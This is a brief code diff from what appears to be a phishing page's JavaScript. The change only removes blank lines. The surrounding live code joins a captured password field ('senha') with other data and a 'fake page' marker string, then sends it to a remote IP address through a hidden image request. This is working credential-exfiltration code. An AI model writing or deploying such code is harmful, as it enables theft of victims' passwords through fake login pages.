@@ -15,6 +15,4 @@ retorno = array.senha +'&|&'+ str2 + '___Recebeu_uma_PAGINA_FALSA_aguarde......'
 
 
 
-
-
 new Image().src = "http://192.168.0.123/?=" + retorno
